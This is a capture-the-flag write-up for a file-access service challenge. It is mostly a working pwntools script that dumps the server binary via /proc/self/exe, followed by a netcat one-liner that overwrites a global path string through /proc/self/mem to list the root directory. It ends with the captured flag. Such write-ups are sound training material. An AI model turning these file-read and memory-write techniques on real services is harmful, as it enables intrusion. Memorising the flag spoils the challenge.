# FAAS (File Access As A Service)-Revenge

We can dump the file reading `/proc/self/exe`. I just vibecoded a script for that:
```py
#!/usr/bin/env python3

from pwn import *
import re
import binascii

HOST = "161.97.155.116"
PORT = 10337
BLOCK = 4096
OUTFILE = "dump_exe.bin"
OPEN_CMD = b"0"   # adjust if the menu numbers differ
READ_CMD = b"1"
HEX_CHOICE = b"2" # choose hex mode so we can reliably reconstruct bytes

def open_path(io, path=b"/proc/self/exe"):
    # send open sequence and sync to menu
    io.recvuntil(b"> ")
    io.sendline(OPEN_CMD)
    io.recvuntil(b"Enter file path:")
    io.sendline(path)
    # consume until back to menu (best-effort)
    try:
        io.recvuntil(b"> ", timeout=1.5)
    except EOFError:
        pass
    except Exception:
        pass

def ensure_open(io, path=b"/proc/self/exe"):
    # try open and check if the service complains later; simple wrapper
    open_path(io, path)

def read_block(io, offset, size=BLOCK):
    """Perform a read at offset for size bytes. Return tuple (status, bytes_or_text).
    status: 'ok' (data returned), 'eof' (No data read..), 'not_editing' (service complained), 'error'
    """
    # select read
    io.recvuntil(b"> ")
    io.sendline(READ_CMD)

    # wait for position prompt
    try:
        io.recvuntil(b"Enter position to read from:", timeout=1.5)
    except Exception:
        # sometimes service prints a message like "You're not editing any files currently"
        # capture whatever is available and return special status
        junk = b""
        try:
            junk = io.recv(timeout=0.5)
        except:
            pass
        if b"You're not editing any files currently" in junk:
            return ("not_editing", junk)
        return ("error", junk)

    io.sendline(str(offset).encode())

    # number of bytes prompt
    try:
        io.recvuntil(b"Enter number of bytes to read", timeout=1.5)
    except Exception:
        # unexpected state
        try:
            junk = io.recv(timeout=0.5)
        except:
            junk = b""
        return ("error", junk)

    io.sendline(str(size).encode())

    # show as prompt
    try:
        io.recvuntil(b"Show as (1) string or (2) hex?", timeout=1.5)
    except Exception:
        try:
            junk = io.recv(timeout=0.5)
        except:
            junk = b""
        return ("error", junk)

    io.sendline(HEX_CHOICE)

    # Now capture until end of content marker OR capture "No data read or end of file reached."
    try:
        # gather everything until the end-of-content marker or until a short timeout
        data = io.recvuntil(b"---- End of content ----", timeout=3)
    except Exception:
        # fallback: grab whatever is there
        try:
            data = io.recv(timeout=1)
        except:
            data = b""

    # Check for EOF message
    if b"No data read or end of file reached." in data:
        return ("eof", data)

    if b"You're not editing any files currently" in data:
        return ("not_editing", data)

    # extract hex blob between markers
    m = re.search(rb"---- File content ----\s*(.*?)\s*---- End of content ----", data, re.S)
    if not m:
        # maybe the service printed only the content without markers (try to extract hex-looking text)
        raw = data
    else:
        raw = m.group(1)

    # sanitize: keep hex chars only (0-9 a-f A-F)
    hexchars = re.findall(rb"[0-9A-Fa-f]+", raw)
    if not hexchars:
        # nothing hex-looking found; return error with raw text
        return ("error", raw)

    # join all hex groups
    hexstr = b"".join(hexchars)
    # If odd length, drop last nibble
    if len(hexstr) % 2 != 0:
        hexstr = hexstr[:-1]

    try:
        blob = binascii.unhexlify(hexstr)
    except Exception as e:
        return ("error", raw + b"\n--- unhex error: " + str(e).encode())

    return ("ok", blob)

def main():
    print("[*] Connecting to {}:{}".format(HOST, PORT))
    io = remote(HOST, PORT, timeout=10)

    print("[*] Opening /proc/self/exe ...")
    ensure_open(io, b"/proc/self/exe")

    out = bytearray()
    offset = 0
    consecutive_errors = 0

    while True:
        status, payload = read_block(io, offset, BLOCK)
        if status == "ok":
            consecutive_errors = 0
            blob = payload
            if blob:
                out.extend(blob)
                print(f"[+] Read block at offset {offset} -> {len(blob)} bytes (total {len(out)})")
            else:
                # got zero bytes but no explicit EOF: stop to avoid infinite loop
                print(f"[-] Read 0 bytes at offset {offset} (no EOF marker); stopping to be safe.")
                break
            offset += BLOCK
        elif status == "eof":
            print(f"[+] EOF marker received at offset {offset}. Stopping.")
            # there might be data in payload before the EOF message; attempt to extract any hex
            # attempt to parse like in 'ok' case
            m = re.search(rb"---- File content ----\s*(.*?)\s*---- End of content ----", payload, re.S)
            if m:
                hexchars = re.findall(rb"[0-9A-Fa-f]+", m.group(1))
                if hexchars:
                    hexstr = b"".join(hexchars)
                    if len(hexstr) % 2 != 0:
                        hexstr = hexstr[:-1]
                    try:
                        tail = binascii.unhexlify(hexstr)
                        out.extend(tail)
                        print(f"[+] Appended final {len(tail)} bytes before EOF (total {len(out)})")
                    except:
                        pass
            break
        elif status == "not_editing":
            print("[!] Service says 'You're not editing any files currently' — re-opening path and retrying")
            ensure_open(io, b"/proc/self/exe")
            consecutive_errors += 1
            if consecutive_errors > 4:
                print("[!] Too many consecutive 'not editing' responses; aborting.")
                break
            continue
        else:
            # generic error: show payload text for debugging, attempt a retry, but avoid infinite loop
            txt = payload if isinstance(payload, bytes) else str(payload).encode()
            printable = txt[:500].decode(errors='ignore')
            print(f"[!] Read error at offset {offset}: {printable!r}")
            consecutive_errors += 1
            if consecutive_errors > 6:
                print("[!] Too many consecutive errors; aborting.")
                break
            # try reopening and retry
            ensure_open(io, b"/proc/self/exe")
            continue

    # save file
    if out:
        with open(OUTFILE, "wb") as f:
            f.write(out)
        print(f"[+] Dump saved to {OUTFILE} ({len(out)} bytes)")
    else:
        print("[-] No data dumped.")

    io.close()

if __name__ == "__main__":
    main()
```

Once we have the binary we can inspect it and find out that the string that holds the route for the option 3 ("3. show available files") it's a global variable (containing "file/") and the binary does not have PIE. We can overwrite this variable with "/////" to allow us to read the root directory.

We must overwrite the binary loaded in memory using `proc/self/mem`.

We execute `(printf "0\n/proc/self/mem\n2\n5\n4837991\n/////\n3\n"; cat)  | nc 161.97.155.116 10337`

Then we read the flag: `QnQSec{fd4557897ece214a941e865d997b3b68}` 






